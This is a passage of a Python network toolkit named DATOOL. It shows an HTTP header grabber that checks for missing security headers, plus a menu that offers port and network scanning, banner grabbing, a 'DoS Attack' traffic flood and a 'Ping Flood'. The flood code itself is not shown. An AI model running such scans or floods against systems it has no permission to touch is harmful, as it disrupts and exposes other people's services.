def http_header_grab():
    section("HTTP HEADER GRABBER")

    target = get_input("Target URL or hostname")
    if not target.startswith("http"):
        target_host = target
    else:
        target_host = target.replace("https://", "").replace("http://", "").split("/")[0]

    ip = resolve_target(target_host)
    if not ip:
        return

    use_ssl_yn = get_input("Use HTTPS? (y/n)", "n")
    use_ssl = use_ssl_yn.lower() == "y"
    port = 443 if use_ssl else 80

    print()
    info(f"Fetching headers from {target_host}:{port}...\n")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))

        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=target_host)

        request = (
            f"HEAD / HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"User-Agent: DATOOL/2.0\r\n"
            f"Connection: close\r\n\r\n"
        )
        sock.send(request.encode())

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        sock.close()

        headers = response.decode(errors="ignore")

        for line in headers.strip().split("\r\n"):
            if line.startswith("HTTP"):
                code = line.split(" ")[1] if len(line.split(" ")) > 1 else "?"
                color = C.GREEN if code.startswith("2") else C.YELLOW if code.startswith("3") else C.RED
                print(f"  {color}{C.BOLD}{line}{C.RESET}")
            elif ":" in line:
                key, _, val = line.partition(":")
                print(f"  {C.WHITE}{key}{C.RESET}:{C.CYAN}{val}{C.RESET}")
            else:
                print(f"  {C.DIM}{line}{C.RESET}")

        # Security analysis
        print(f"\n  {C.BOLD}Security Headers Analysis:{C.RESET}")
        h_lower = headers.lower()
        checks = {
            "X-Frame-Options": "x-frame-options",
            "X-XSS-Protection": "x-xss-protection",
            "X-Content-Type-Options": "x-content-type-options",
            "Strict-Transport-Security": "strict-transport-security",
            "Content-Security-Policy": "content-security-policy",
            "Referrer-Policy": "referrer-policy",
            "Permissions-Policy": "permissions-policy",
        }
        for name, check in checks.items():
            present = check in h_lower
            status = f"{C.GREEN}✓ Present" if present else f"{C.RED}✗ Missing"
            print(f"    {status:<30}{C.RESET} {name}")

    except Exception as e:
        error(f"Failed: {e}")

# ═══════════════════════════════════════════════════════════
# MAIN MENU
# ═══════════════════════════════════════════════════════════

def main_menu():
    while True:
        banner()
        print(f"  {C.WHITE}{C.BOLD}Select a tool:{C.RESET}\n")
        options = [
            ("1", "Port Scanner", "Scan ports on a target host", C.GREEN),
            ("2", "DoS Attack", "Flood a target with traffic", C.RED),
            ("3", "Network Scanner", "Discover alive hosts on network", C.CYAN),
            ("4", "DNS Lookup", "Query DNS records for a domain", C.BLUE),
            ("5", "IP Geolocation", "Locate an IP address", C.MAGENTA),
            ("6", "Banner Grabber", "Grab service banners from ports", C.YELLOW),
            ("7", "Ping Flood", "ICMP ping flood", C.ORANGE),
            ("8", "WHOIS Lookup", "Domain/IP registration info", C.PINK),
            ("9", "Traceroute", "Trace packet route to target", C.CYAN),
            ("10", "HTTP Headers", "Grab & analyze HTTP headers", C.GREEN),
            ("0", "Exit", "Quit DATOOL", C.RED),
        ]
        for num, name, desc, color in options:
            print(f"    {color}[{num:>2}]{C.RESET}  {C.WHITE}{name:<20}{C.RESET}{C.DIM}{desc}{C.RESET}")

        print()
        choice = get_input("Choice", "0")

        try:
            actions = {
                "1": port_scanner,
                "2": dos_attack,
                "3": network_scanner,
                "4": dns_lookup,
                "5": ip_geolocation,
                "6": banner_grabber,
                "7": ping_flood,
                "8": whois_lookup,
                "9": traceroute,
                "10": http_header_grab,
            }

            if choice == "0":
                print(f"\n  {C.RED}Goodbye.{C.RESET}\n")
                sys.exit(0)
            elif choice in actions:
                actions[choice]()
            else:
                warn("Invalid option.")

        except KeyboardInterrupt:
            print(f"\n\n  {C.YELLOW}Returning to menu...{C.RESET}")
        except Exception as e:
            error(f"Error: {e}")

        print()
        input(f"  {C.GREY}Press Enter to return to menu...{C.RESET}")

# ═══════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n  {C.RED}Exited.{C.RESET}\n")
        sys.exit(0)
